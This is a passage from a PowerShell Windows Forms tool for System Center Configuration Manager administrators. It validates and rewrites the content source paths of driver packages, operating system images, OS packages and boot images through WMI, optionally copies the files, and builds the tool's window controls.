                                    $UpdatedDriverPackageSourcePath = $DriverPackage.PkgSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                                    
                                    if ($CopyFiles -eq $true) {
                                        if (-not(Test-Path -Path $UpdatedDriverPackageSourcePath)) {
                                            New-Item -Path $UpdatedDriverPackageSourcePath -ItemType Directory | Out-Null
                                        }
                                        if ((Get-ChildItem -Path $UpdatedDriverPackageSourcePath | Measure-Object).Count -eq 0) {
                                            if (Test-Path -Path $ExistingDriverPackageSourcePath) {
                                                $ExistingDriverPackageSourcePathItems = Get-ChildItem -Path $ExistingDriverPackageSourcePath
                                                Write-OutputBox -OutputBoxMessage "Copying content source files from $($ExistingDriverPackageSourcePath) to $($UpdatedDriverPackageSourcePath)" -Type INFO
                                                foreach ($ExistingDriverPackageSourcePathItem in $ExistingDriverPackageSourcePathItems) {
                                                    Copy-Item -Path $ExistingDriverPackageSourcePathItem.FullName -Destination $UpdatedDriverPackageSourcePath -Force -Recurse
                                                }
                                            }
                                            else {
                                                Write-OutputBox -OutputBoxMessage "Unable to access $($ExistingDriverPackageSourcePath)" -Type WARNING
                                            }
                                        }
                                    }
                                    
                                    $DriverPackage.PkgSourcePath = $UpdatedDriverPackageSourcePath
                                    $DriverPackage.Put() | Out-Null
                                    $ValidateDriverPackage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_DriverPackage" -ComputerName $SiteServer -Filter "PackageID like '$($CellDriverPackageID)'"
                                    if ($ValidateDriverPackage.PkgSourcePath -eq $UpdatedDriverPackageSourcePath) {
                                        Write-OutputBox -OutputBoxMessage "Updated driver package '$($DriverPackageName)'" -Type INFO
                                    }
                                    else {
                                        Write-OutputBox -OutputBoxMessage "An error occurred while updating driver package '$($DriverPackageName)'" -Type ERROR
                                    }
                                    [System.Windows.Forms.Application]::DoEvents()
                                }
                                else {
                                    Write-OutputBox -OutputBoxMessage "No matching content source for driver package '$($DriverPackageName)' was found" -Type INFO
                                }
                            }
                            else {
                                Write-OutputBox -OutputBoxMessage "Validation of driver package '$($DriverPackageName)' detected that there was no associated content" -Type INFO
                            }
                        }
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed updating content sources" -Type INFO
                $ButtonStart.Enabled = $false
            }
        }
    }

    function Update-OperatingSystemImageContentSource {
        param(
            [parameter(Mandatory=$true)]
            [ValidateSet("Validate","Update")]
            [string]$Action,
            [parameter(Mandatory=$false)]
            [switch]$CopyFiles
        )
        Process {
            if ($Action -eq "Validate") {
                $OperatingSystemImageCount = 0
                Update-StatusBar -Activity Enumerating -Text " "
                $OperatingSystemImages = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_ImagePackage" -ComputerName $SiteServer
                $OperatingSystemImagesCount = ($OperatingSystemImages | Measure-Object).Count
                foreach ($OperatingSystemImage in $OperatingSystemImages) {
                    $OperatingSystemImageCount++
                    $OperatingSystemImageName = $OperatingSystemImage.Name
                    $OperatingSystemImageID = $OperatingSystemImage.PackageID
                    Update-StatusBar -Activity Validating -Text "Validating operating system image $($OperatingSystemImageCount) / $($OperatingSystemImagesCount)"
                    if ($OperatingSystemImage.PkgSourcePath -ne $null) {
                        if ($OperatingSystemImage.PkgSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                            $ExistingOperatingSystemImageSourcePath = $OperatingSystemImage.PkgSourcePath
                            $UpdatedOperatingSystemImageSourcePath = $OperatingSystemImage.PkgSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                            $DGVResults.Rows.Add($true, $OperatingSystemImageName, $ExistingOperatingSystemImageSourcePath, $UpdatedOperatingSystemImageSourcePath, $OperatingSystemImageID)
                            Write-OutputBox -OutputBoxMessage "Successfully validated operating system image '$($OperatingSystemImageName)'" -Type INFO
                            [System.Windows.Forms.Application]::DoEvents()
                        }
                        else {
                            Write-OutputBox -OutputBoxMessage "No matching content source for operating system image '$($OperatingSystemImageName)' was found" -Type INFO
                        }
                    }
                    else {
                        Write-OutputBox -OutputBoxMessage "Validation of operating system image '$($OperatingSystemImageName)' detected that there was no associated content" -Type INFO
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed content source validation" -Type INFO
                $ButtonStart.Enabled = $true
            }
            if ($Action -eq "Update") {
                
                $OperatingSystemImageCount = 0
                $OperatingSystemImageRowCount = 0
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    if ($DGVResults.Rows[$RowIndex].Cells[0].Value -eq $true) {
                        $OperatingSystemImageRowCount++
                    }
                }
                
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    $CellOperatingSystemImageName = $DGVResults.Rows[$RowIndex].Cells[1].Value
                    $CellOperatingSystemImageSelected = $DGVResults.Rows[$RowIndex].Cells[0].Value
                    $CellOperatingSystemImageID = $DGVResults.Rows[$RowIndex].Cells[4].Value
                    if ($CellOperatingSystemImageSelected -eq $true) {
                        $OperatingSystemImageCount++
                        $OperatingSystemImage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_ImagePackage" -ComputerName $SiteServer -Filter "PackageID like '$($CellOperatingSystemImageID)'"
                        if ($OperatingSystemImage -ne $null) {
                            $OperatingSystemImageName = $OperatingSystemImage.Name
                            Update-StatusBar -Activity Validating -Text "Updating operating system image $($OperatingSystemImageCount) / $($OperatingSystemImageRowCount)"
                            [System.Windows.Forms.Application]::DoEvents()
                            if ($OperatingSystemImage.PkgSourcePath -ne $null) {
                                if ($OperatingSystemImage.PkgSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                                    $ExistingOperatingSystemImageSourcePath = $OperatingSystemImage.PkgSourcePath
                                    $UpdatedOperatingSystemImageSourcePath = $OperatingSystemImage.PkgSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                                    
                                    $AmendUpdatedOperatingSystemImageSourcePath = Split-Path -Path $UpdatedOperatingSystemImageSourcePath -Parent
                                    
                                    if ($CopyFiles -eq $true) {
                                        if (-not(Test-Path -Path $AmendUpdatedOperatingSystemImageSourcePath)) {
                                            New-Item -Path $AmendUpdatedOperatingSystemImageSourcePath -ItemType Directory | Out-Null
                                        }
                                        if (Test-Path -Path $ExistingOperatingSystemImageSourcePath) {
                                            $ExistingOperatingSystemImageSourcePathItems = Get-ChildItem -Path $ExistingOperatingSystemImageSourcePath
                                            Write-OutputBox -OutputBoxMessage "Copying wim file $($ExistingOperatingSystemImageSourcePath) to $($AmendUpdatedOperatingSystemImageSourcePath)" -Type INFO
                                            foreach ($ExistingOperatingSystemImageSourcePathItem in $ExistingOperatingSystemImageSourcePathItems) {
                                                Copy-Item -Path $ExistingOperatingSystemImageSourcePathItem.FullName -Destination $AmendUpdatedOperatingSystemImageSourcePath -Force -Recurse
                                            }
                                        }
                                        else {
                                            Write-OutputBox -OutputBoxMessage "Unable to access $($ExistingOperatingSystemImageSourcePath)" -Type WARNING
                                        }
                                    }
                                    
                                    if (Test-Path -Path $UpdatedOperatingSystemImageSourcePath) {
                                        $OperatingSystemImage.Get()
                                        $OperatingSystemImage.PkgSourcePath = $UpdatedOperatingSystemImageSourcePath
                                        $OperatingSystemImage.Put() | Out-Null
                                        $ValidateOperatingSystemImage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_ImagePackage" -ComputerName $SiteServer -Filter "PackageID like '$($CellOperatingSystemImageID)'"
                                        if ($ValidateOperatingSystemImage.PkgSourcePath -eq $UpdatedOperatingSystemImageSourcePath) {
                                            Write-OutputBox -OutputBoxMessage "Updated operating system image '$($OperatingSystemImageName)'" -Type INFO
                                        }
                                        else {
                                            Write-OutputBox -OutputBoxMessage "An error occurred while updating operating system image '$($OperatingSystemImageName)'" -Type ERROR
                                        }
                                        [System.Windows.Forms.Application]::DoEvents()
                                    }
                                    else {
                                        Write-OutputBox -OutputBoxMessage "Unable to locate $($OperatingSystemImageName) wim file on updated content source path. Manually copy the content files or check the Copy content files to new location check box " -Type WARNING
                                    }
                                }
                                else {
                                    Write-OutputBox -OutputBoxMessage "No matching content source for operating system image '$($OperatingSystemImageName)' was found" -Type INFO
                                }
                            }
                            else {
                                Write-OutputBox -OutputBoxMessage "Validation of operating system image '$($OperatingSystemImageName)' detected that there was no associated content" -Type INFO
                            }
                        }
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed updating content sources" -Type INFO
                $ButtonStart.Enabled = $false
            }
        }
    }
    
    function Update-OperatingSystemPackageContentSource {
        param(
            [parameter(Mandatory=$true)]
            [ValidateSet("Validate","Update")]
            [string]$Action,
            [parameter(Mandatory=$false)]
            [switch]$CopyFiles
        )
        Process {
            if ($Action -eq "Validate") {
                $OperatingSystemPackageCount = 0
                Update-StatusBar -Activity Enumerating -Text " "
                $OperatingSystemPackages = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_OperatingSystemInstallPackage" -ComputerName $SiteServer
                $OperatingSystemPackagesCount = ($OperatingSystemPackages | Measure-Object).Count
                foreach ($OperatingSystemPackage in $OperatingSystemPackages) {
                    $OperatingSystemPackageCount++
                    $OperatingSystemPackageName = $OperatingSystemPackage.Name
                    $OperatingSystemPackageID = $OperatingSystemPackage.PackageID
                    Update-StatusBar -Activity Validating -Text "Validating operating system package $($OperatingSystemPackageCount) / $($OperatingSystemPackagesCount)"
                    if ($OperatingSystemPackage.PkgSourcePath -ne $null) {
                        if ($OperatingSystemPackage.PkgSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                            $ExistingOperatingSystemPackageSourcePath = $OperatingSystemPackage.PkgSourcePath
                            $UpdatedOperatingSystemPackageSourcePath = $OperatingSystemPackage.PkgSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                            $DGVResults.Rows.Add($true, $OperatingSystemPackageName, $ExistingOperatingSystemPackageSourcePath, $UpdatedOperatingSystemPackageSourcePath, $OperatingSystemPackageID)
                            Write-OutputBox -OutputBoxMessage "Successfully validated operating system package '$($OperatingSystemPackageName)'" -Type INFO
                            [System.Windows.Forms.Application]::DoEvents()
                        }
                        else {
                            Write-OutputBox -OutputBoxMessage "No matching content source for operating system package '$($OperatingSystemPackageName)' was found" -Type INFO
                        }
                    }
                    else {
                        Write-OutputBox -OutputBoxMessage "Validation of operating system package '$($OperatingSystemPackageName)' detected that there was no associated content" -Type INFO
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed content source validation" -Type INFO
                $ButtonStart.Enabled = $true
            }
            if ($Action -eq "Update") {
                
                $OperatingSystemPackageCount = 0
                $OperatingSystemPackageRowCount = 0
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    if ($DGVResults.Rows[$RowIndex].Cells[0].Value -eq $true) {
                        $OperatingSystemPackageRowCount++
                    }
                }
                
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    $CellOperatingSystemPackageName = $DGVResults.Rows[$RowIndex].Cells[1].Value
                    $CellOperatingSystemPackageSelected = $DGVResults.Rows[$RowIndex].Cells[0].Value
                    $CellOperatingSystemPackageID = $DGVResults.Rows[$RowIndex].Cells[4].Value
                    if ($CellOperatingSystemPackageSelected -eq $true) {
                        $OperatingSystemPackageCount++
                        $OperatingSystemPackage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_OperatingSystemInstallPackage" -ComputerName $SiteServer -Filter "PackageID like '$($CellOperatingSystemPackageID)'"
                        if ($OperatingSystemPackage -ne $null) {
                            $OperatingSystemPackageName = $OperatingSystemPackage.Name
                            Update-StatusBar -Activity Validating -Text "Updating operating system package $($OperatingSystemPackageCount) / $($OperatingSystemPackageRowCount)"
                            [System.Windows.Forms.Application]::DoEvents()
                            if ($OperatingSystemPackage.PkgSourcePath -ne $null) {
                                if ($OperatingSystemPackage.PkgSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                                    $ExistingOperatingSystemPackageSourcePath = $OperatingSystemPackage.PkgSourcePath
                                    $UpdatedOperatingSystemPackageSourcePath = $OperatingSystemPackage.PkgSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                                    
                                    if ($CopyFiles -eq $true) {
                                        if (-not(Test-Path -Path $UpdatedOperatingSystemPackageSourcePath)) {
                                            New-Item -Path $UpdatedOperatingSystemPackageSourcePath -ItemType Directory | Out-Null
                                        }
                                        if ((Get-ChildItem -Path $UpdatedOperatingSystemPackageSourcePath | Measure-Object).Count -eq 0) {
                                            if (Test-Path -Path $ExistingOperatingSystemPackageSourcePath) {
                                                $ExistingOperatingSystemPackageSourcePathItems = Get-ChildItem -Path $ExistingOperatingSystemPackageSourcePath
                                                Write-OutputBox -OutputBoxMessage "Copying content source files from $($ExistingOperatingSystemPackageSourcePath) to $($UpdatedOperatingSystemPackageSourcePath)" -Type INFO
                                                foreach ($ExistingOperatingSystemPackageSourcePathItem in $ExistingOperatingSystemPackageSourcePathItems) {
                                                    Copy-Item -Path $ExistingOperatingSystemPackageSourcePathItem.FullName -Destination $UpdatedOperatingSystemPackageSourcePath -Force -Recurse
                                                }
                                            }
                                            else {
                                                Write-OutputBox -OutputBoxMessage "Unable to access $($ExistingOperatingSystemPackageSourcePath)" -Type WARNING
                                            }
                                        }
                                    }
                                    
                                    $OperatingSystemPackage.Get()
                                    $OperatingSystemPackage.PkgSourcePath = $UpdatedOperatingSystemPackageSourcePath
                                    $OperatingSystemPackage.Put() | Out-Null
                                    $ValidateOperatingSystemPackage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_OperatingSystemInstallPackage" -ComputerName $SiteServer -Filter "PackageID like '$($CellOperatingSystemPackageID)'"
                                    if ($ValidateOperatingSystemPackage.PkgSourcePath -eq $UpdatedOperatingSystemPackageSourcePath) {
                                        Write-OutputBox -OutputBoxMessage "Updated operating system package '$($OperatingSystemPackageName)'" -Type INFO
                                    }
                                    else {
                                        Write-OutputBox -OutputBoxMessage "An error occurred while updating operating system package '$($OperatingSystemPackageName)'" -Type ERROR
                                    }
                                    [System.Windows.Forms.Application]::DoEvents()
                                }
                                else {
                                    Write-OutputBox -OutputBoxMessage "No matching content source for operating system package '$($OperatingSystemPackageName)' was found" -Type INFO
                                }
                            }
                            else {
                                Write-OutputBox -OutputBoxMessage "Validation of operating system package '$($OperatingSystemPackageName)' detected that there was no associated content" -Type INFO
                            }
                        }
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed updating content sources" -Type INFO
                $ButtonStart.Enabled = $false
            }
        }
    }

    function Update-BootImageContentSource {
        param(
            [parameter(Mandatory=$true)]
            [ValidateSet("Validate","Update")]
            [string]$Action,
            [parameter(Mandatory=$false)]
            [switch]$CopyFiles
        )
        Process {
            if ($Action -eq "Validate") {
                $BootImageCount = 0
                Update-StatusBar -Activity Enumerating -Text " "
                $BootImages = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_BootImagePackage" -ComputerName $SiteServer
                $BootImagesCount = ($BootImages | Measure-Object).Count
                foreach ($BootImage in $BootImages) {
                    $BootImageCount++
                    $BootImageName = $BootImage.Name
                    $BootImageID = $BootImage.PackageID
                    Update-StatusBar -Activity Validating -Text "Validating operating system image $($BootImageCount) / $($BootImagesCount)"
                    if ($BootImage.PkgSourcePath -ne $null) {
                        if ($BootImage.PkgSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                            $ExistingBootImageSourcePath = $BootImage.PkgSourcePath
                            $UpdatedBootImageSourcePath = $BootImage.PkgSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                            $DGVResults.Rows.Add($true, $BootImageName, $ExistingBootImageSourcePath, $UpdatedBootImageSourcePath, $BootImageID)
                            Write-OutputBox -OutputBoxMessage "Successfully validated boot image '$($BootImageName)'" -Type INFO
                            [System.Windows.Forms.Application]::DoEvents()
                        }
                        else {
                            Write-OutputBox -OutputBoxMessage "No matching content source for boot image '$($BootImageName)' was found" -Type INFO
                        }
                    }
                    else {
                        Write-OutputBox -OutputBoxMessage "Validation of boot image '$($BootImageName)' detected that there was no associated content" -Type INFO
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed content source validation" -Type INFO
                $ButtonStart.Enabled = $true
            }
            if ($Action -eq "Update") {
                
                $BootImageCount = 0
                $BootImageRowCount = 0
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    if ($DGVResults.Rows[$RowIndex].Cells[0].Value -eq $true) {
                        $BootImageRowCount++
                    }
                }
                
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    $CellBootImageName = $DGVResults.Rows[$RowIndex].Cells[1].Value
                    $CellBootImageSelected = $DGVResults.Rows[$RowIndex].Cells[0].Value
                    $CellBootImageID = $DGVResults.Rows[$RowIndex].Cells[4].Value
                    if ($CellBootImageSelected -eq $true) {
                        $BootImageCount++
                        $BootImage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_BootImagePackage" -ComputerName $SiteServer -Filter "PackageID like '$($CellBootImageID)'"
                        if ($BootImage -ne $null) {
                            $BootImageName = $BootImage.Name
                            Update-StatusBar -Activity Validating -Text "Updating boot image $($BootImageCount) / $($BootImageRowCount)"
                            [System.Windows.Forms.Application]::DoEvents()
                            if ($BootImage.PkgSourcePath -ne $null) {
                                if ($BootImage.PkgSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                                    $ExistingBootImageSourcePath = $BootImage.PkgSourcePath
                                    $UpdatedBootImageSourcePath = $BootImage.PkgSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                                    
                                    if ($CopyFiles -eq $true) {
                                        if (-not(Test-Path -Path $UpdatedBootImageSourcePath)) {
                                            New-Item -Path $UpdatedBootImageSourcePath -ItemType Directory | Out-Null
                                        }
                                        if ((Get-ChildItem -Path $UpdatedBootImageSourcePath | Measure-Object).Count -eq 0) {
                                            if (Test-Path -Path $ExistingBootImageSourcePath) {
                                                $ExistingBootImageSourcePathItems = Get-ChildItem -Path $ExistingBootImageSourcePath
                                                Write-OutputBox -OutputBoxMessage "Copying content source files from $($ExistingBootImageSourcePath) to $($UpdatedBootImageSourcePath)" -Type INFO
                                                foreach ($ExistingBootImageSourcePathItem in $ExistingBootImageSourcePathItems) {
                                                    Copy-Item -Path $ExistingBootImageSourcePathItem.FullName -Destination $UpdatedBootImageSourcePath -Force -Recurse
                                                }
                                            }
                                            else {
                                                Write-OutputBox -OutputBoxMessage "Unable to access $($ExistingBootImageSourcePath)" -Type WARNING
                                            }
                                        }
                                    }
                                    
                                    $BootImage.Get()
                                    $BootImage.PkgSourcePath = $UpdatedBootImageSourcePath
                                    $BootImage.Put() | Out-Null
                                    $ValidateBootImage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_BootImagePackage" -ComputerName $SiteServer -Filter "PackageID like '$($CellBootImageID)'"
                                    if ($ValidateBootImage.PkgSourcePath -eq $UpdatedBootImageSourcePath) {
                                        Write-OutputBox -OutputBoxMessage "Updated boot image '$($BootImageName)'" -Type INFO
                                    }
                                    else {
                                        Write-OutputBox -OutputBoxMessage "An error occurred while updating boot image '$($BootImageName)'" -Type ERROR
                                    }
                                    [System.Windows.Forms.Application]::DoEvents()
                                }
                                else {
                                    Write-OutputBox -OutputBoxMessage "No matching content source for boot image '$($BootImageName)' was found" -Type INFO
                                }
                            }
                            else {
                                Write-OutputBox -OutputBoxMessage "Validation of boot image '$($BootImageName)' detected that there was no associated content" -Type INFO
                            }
                        }
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed updating content sources" -Type INFO
                $ButtonStart.Enabled = $false
            }
        }
    }

    
    $Form = New-Object System.Windows.Forms.Form    
    $Form.Size = New-Object System.Drawing.Size(900,700)  
    $Form.MinimumSize = New-Object System.Drawing.Size(900,700)
    $Form.MaximumSize = New-Object System.Drawing.Size([System.Int32]::MaxValue,[System.Int32]::MaxValue)
    $Form.SizeGripStyle = "Show"
    $Form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($PSHome + "\powershell.exe")
    $Form.Text = "ConfigMgr Content Source Update Tool 1.0.0"
    $Form.ControlBox = $true
    $Form.TopMost = $false

    
    $ButtonStart = New-Object System.Windows.Forms.Button 
    $ButtonStart.Location = New-Object System.Drawing.Size(762,35)
    $ButtonStart.Size = New-Object System.Drawing.Size(95,30) 
    $ButtonStart.Text = "Update"
    $ButtonStart.TabIndex = "3"
    $ButtonStart.Anchor = "Top, Right"
    $ButtonStart.Enabled = $false
    $ButtonStart.Add_Click({
        if ($CheckBoxCopyContent.Checked -eq $true) {
            $CopyFiles = $true
        }
        else {
            $CopyFiles = $false
        }
        switch ($ComboBoxTypes.SelectedItem) {
            "Application" {
                Invoke-CleanControls -Option Log
                Update-ApplicationContentSource -Action Update -CopyFiles:$CopyFiles
            }
            "Package" {
                Invoke-CleanControls -Option Log
                Update-PackageContentSource -Action Update -CopyFiles:$CopyFiles
            }
            "Deployment Package" {
                Invoke-CleanControls -Option Log
                Update-DeploymentPackageContentSource -Action Update -CopyFiles:$CopyFiles
            }
            "Driver" {
                Invoke-CleanControls -Option Log
                Update-DriverContentSource -Action Update -CopyFiles:$CopyFiles
            }
            "Driver Package" {
                Invoke-CleanControls -Option Log
                Update-DriverPackageContentSource -Action Update -CopyFiles:$CopyFiles
            }
            "Operating System Image" {
                Invoke-CleanControls -Option Log
                Update-OperatingSystemImageContentSource -Action Update -CopyFiles:$CopyFiles
            }
            "Operating System Package" {
                Invoke-CleanControls -Option Log
                Update-OperatingSystemPackageContentSource -Action Update -CopyFiles:$CopyFiles
            }
            "Boot Image" {
                Invoke-CleanControls -Option Log
                Update-BootImageContentSource -Action Update -CopyFiles:$CopyFiles
            }
        }
    })
    $ButtonValidate = New-Object System.Windows.Forms.Button 
    $ButtonValidate.Location = New-Object System.Drawing.Size(762,75)
    $ButtonValidate.Size = New-Object System.Drawing.Size(95,30) 
    $ButtonValidate.Text = "Validate"
    $ButtonValidate.TabIndex = "2"
    $ButtonValidate.Anchor = "Top, Right"
    $ButtonValidate.Enabled = $false
    $ButtonValidate.Add_Click({
        if ($CheckBoxCopyContent.Checked -eq $true) {
            $CopyFiles = $true
        }
        else {
            $CopyFiles = $false
        }
        switch ($ComboBoxTypes.SelectedItem) {
            "Application" {
                Invoke-CleanControls -Option All
                Update-ApplicationContentSource -Action Validate -CopyFiles:$CopyFiles
            }
            "Package" {
                Invoke-CleanControls -Option All
                Update-PackageContentSource -Action Validate -CopyFiles:$CopyFiles
            }
            "Deployment Package" {
                Invoke-CleanControls -Option All
                Update-DeploymentPackageContentSource -Action Validate -CopyFiles:$CopyFiles
            }
            "Driver" {
                Invoke-CleanControls -Option All
                Update-DriverContentSource -Action Validate -CopyFiles:$CopyFiles
            }
            "Driver Package" {
                Invoke-CleanControls -Option All
                Update-DriverPackageContentSource -Action Validate -CopyFiles:$CopyFiles
            }
            "Operating System Image" {
                Invoke-CleanControls -Option All
                Update-OperatingSystemImageContentSource -Action Validate -CopyFiles:$CopyFiles
            }
            "Operating System Package" {
                Invoke-CleanControls -Option All
                Update-OperatingSystemPackageContentSource -Action Validate -CopyFiles:$CopyFiles
            }
            "Boot Image" {
                Invoke-CleanControls -Option All
                Update-BootImageContentSource -Action Validate -CopyFiles:$CopyFiles
            }
        }    
    })

    
    $GBMatch = New-Object -TypeName System.Windows.Forms.GroupBox
    $GBMatch.Location = New-Object -TypeName System.Drawing.Size(10,10)
    $GBMatch.Size = New-Object -TypeName System.Drawing.Size(500,50)
    $GBMatch.Anchor = "Top, Left, Right"
    $GBMatch.Text = "Match pattern for Content Source locations"
    $GBReplace = New-Object -TypeName System.Windows.Forms.GroupBox
    $GBReplace.Location = New-Object -TypeName System.Drawing.Size(10,70)
    $GBReplace.Size = New-Object -TypeName System.Drawing.Size(500,50)
    $GBReplace.Anchor = "Top, Left, Right"
    $GBReplace.Text = "Replace pattern for Content Source locations"
    $GBOptions = New-Object -TypeName System.Windows.Forms.GroupBox
    $GBOptions.Location = New-Object -TypeName System.Drawing.Size(520,10)
    $GBOptions.Size = New-Object -TypeName System.Drawing.Size(220,110)
    $GBOptions.Anchor = "Top, Right"
    $GBOptions.Text = "Options"
    $GBActions = New-Object -TypeName System.Windows.Forms.GroupBox
    $GBActions.Location = New-Object -TypeName System.Drawing.Size(750,10)
    $GBActions.Size = New-Object -TypeName System.Drawing.Size(120,110)
    $GBActions.Anchor = "Top, Right"
    $GBActions.Text = "Actions"
    $GBResults = New-Object -TypeName System.Windows.Forms.GroupBox
    $GBResults.Location = New-Object -TypeName System.Drawing.Size(10,130)
    $GBResults.Size = New-Object -TypeName System.Drawing.Size(860,315)
    $GBResults.Anchor = "Top, Bottom, Left, Right"
    $GBResults.Text = "Content Source information"
    $GBLog = New-Object -TypeName System.Windows.Forms.GroupBox
    $GBLog.Location = New-Object -TypeName System.Drawing.Size(10,455)
    $GBLog.Size = New-Object -TypeName System.Drawing.Size(860,175)
    $GBLog.Anchor = "Bottom, Left, Right"
    $GBLog.Text = "Logging"

    
    $ComboBoxTypes = New-Object System.Windows.Forms.ComboBox
    $ComboBoxTypes.Location = New-Object System.Drawing.Size(530,30) 
    $ComboBoxTypes.Size = New-Object System.Drawing.Size(200,20)
    $ComboBoxTypes.Items.AddRange(@("Application","Package","Deployment Package","Driver","Driver Package","Operating System Image","Operating System Upgrade Package","Boot Image"))
    $ComboBoxTypes.SelectedItem = "Application"
    $ComboBoxTypes.Anchor = "Top, Right"
    $ComboBoxTypes.DropDownStyle = [System.Windows.Forms.ComboBoxStyle]::DropDownList
    $ComboBoxTypes.Add_SelectedIndexChanged({
        $DGVResults.Rows.Clear()
        $ButtonStart.Enabled = $false
        if ($ComboBoxTypes.SelectedItem -eq "Application") {
            $DGVResults.Columns.Clear()
            $DGVResults.Columns.Insert(0,(New-Object -TypeName System.Windows.Forms.DataGridViewCheckBoxColumn))
            $DGVResults.Columns[0].Name = "Update"
            $DGVResults.Columns[0].Resizable = [System.Windows.Forms.DataGridViewTriState]::False
            $DGVResults.Columns[0].Width = "50"
            $DGVResults.Columns.Insert(1,(New-Object -TypeName System.Windows.Forms.DataGridViewTextBoxColumn))
            $DGVResults.Columns[1].Name = $ComboBoxTypes.SelectedItem
            $DGVResults.Columns[1].Width = "200"
            $DGVResults.Columns[1].ReadOnly = $true
            $DGVResults.Columns.Insert(2,(New-Object -TypeName System.Windows.Forms.DataGridViewTextBoxColumn))
            $DGVResults.Columns[2].Name = "Deployment Type"
            $DGVResults.Columns[2].AutoSizeMode = "Fill"
            $DGVResults.Columns[2].ReadOnly = $true
            $DGVResults.Columns.Insert(3,(New-Object -TypeName System.Windows.Forms.DataGridViewTextBoxColumn))
            $DGVResults.Columns[3].Name = "Existing Content Source"
            $DGVResults.Columns[3].AutoSizeMode = "Fill"
            $DGVResults.Columns[3].ReadOnly = $true
            $DGVResults.Columns.Insert(4,(New-Object -TypeName System.Windows.Forms.DataGridViewTextBoxColumn))
            $DGVResults.Columns[4].Name = "Updated Content Source"
            $DGVResults.Columns[4].AutoSizeMode = "Fill"
            $DGVResults.Columns[4].ReadOnly = $true
        }
        else {
            $DGVResults.Columns.Clear()
            $DGVResults.Columns.Insert(0,(New-Object -TypeName System.Windows.Forms.DataGridViewCheckBoxColumn))
            $DGVResults.Columns[0].Name = "Update"
            $DGVResults.Columns[0].Resizable = [System.Windows.Forms.DataGridViewTriState]::False
            $DGVResults.Columns[0].Width = "50"
            $DGVResults.Columns.Insert(1,(New-Object -TypeName System.Windows.Forms.DataGridViewTextBoxColumn))
            $DGVResults.Columns[1].Name = $ComboBoxTypes.SelectedItem
            $DGVResults.Columns[1].Width = "200"
            $DGVResults.Columns[1].ReadOnly = $true
            $DGVResults.Columns.Insert(2,(New-Object -TypeName System.Windows.Forms.DataGridViewTextBoxColumn))
            $DGVResults.Columns[2].Name = "Existing Content Source"
            $DGVResults.Columns[2].AutoSizeMode = "Fill"
            $DGVResults.Columns[2].ReadOnly = $true
            $DGVResults.Columns.Insert(3,(New-Object -TypeName System.Windows.Forms.DataGridViewTextBoxColumn))
            $DGVResults.Columns[3].Name = "Updated Content Source"
            $DGVResults.Columns[3].AutoSizeMode = "Fill"
            $DGVResults.Columns[3].ReadOnly = $true
            $DGVResults.Columns.Insert(4,(New-Object -TypeName System.Windows.Forms.DataGridViewTextBoxColumn))
            $DGVResults.Columns[4].Name = "ID"
            $DGVResults.Columns[4].AutoSizeMode = "Fill"
            $DGVResults.Columns[4].ReadOnly = $true
            $DGVResults.Columns[4].Visible = $false
        }
    })

    
    $CheckBoxCopyContent = New-Object System.Windows.Forms.CheckBox
    $CheckBoxCopyContent.Location = New-Object System.Drawing.Size(530,60) 
    $CheckBoxCopyContent.Size = New-Object System.Drawing.Size(200,20)
    $CheckBoxCopyContent.Text = "Copy content files to new location"
    $CheckBoxCopyContent.Anchor = "Top, Right"

    
    $TextBoxMatch = New-Object System.Windows.Forms.TextBox
    $TextBoxMatch.Location = New-Object System.Drawing.Size(20,28) 
    $TextBoxMatch.Size = New-Object System.Drawing.Size(480,20)
    $TextBoxMatch.TabIndex = "0"
    $TextBoxMatch.Anchor = "Top, Left, Right"
    $TextBoxMatch.Add_TextChanged({
